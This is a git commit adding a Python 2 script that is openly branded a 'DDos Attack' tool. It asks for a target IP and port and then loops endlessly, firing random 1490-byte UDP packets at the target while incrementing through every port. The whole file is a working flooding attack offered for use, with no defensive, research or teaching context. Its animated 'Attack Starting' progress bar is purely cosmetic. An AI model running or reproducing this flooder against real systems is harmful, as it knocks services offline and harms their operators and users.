cda3ddb7a4dfe5010d08221f9c5d682c3ea897ab
ceriani <54410375+ceriani@users.noreply.github.com>
2020-07-30 03:18:05 -0230

    Create cerianiV2.0.py

---
+++ cerianiV2.0.py
@@ -0,0 +1,64 @@
+ 
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print " ######  ######## ########  ####    ###    ##    ## #### "
+print "##    ## ##       ##     ##  ##    ## ##   ###   ##  ##  "
+print "##       ##       ##     ##  ##   ##   ##  ####  ##  ##  "
+print "##       ######   ########   ##  ##     ## ## ## ##  ##  "
+print "##       ##       ##   ##    ##  ######### ##  ####  ##  "
+print "##    ## ##       ##    ##   ##  ##     ## ##   ###  ##  "
+print " ######  ######## ##     ## #### ##     ## ##    ## #### "
+print " ad888888b,       ,a888a,    "
+print "d8*     *88     ,8P*' `*Y8,  "
+print "         88    ,8P       Y8, "
+print "        d8P    88         88 "
+print "       a8P     88         88 "
+print "     ,d8P      88         88 "
+print "   ,d8P'       88         88 "
+print " ,d8P'         `8b       d8' "
+print "a88*        d8b `8ba, ,ad8'  "
+print "88888888888 Y8P   *Y888P*    "
+print
+ip = raw_input("IP De Ataque : ")
+port = input("Puerto : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(1)
+print "[=====               ] 25%"
+time.sleep(1)
+print "[==========          ] 50%"
+time.sleep(1)
+print "[===============     ] 75%"
+time.sleep(1)
+print "[====================] 100%"
+time.sleep(1)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
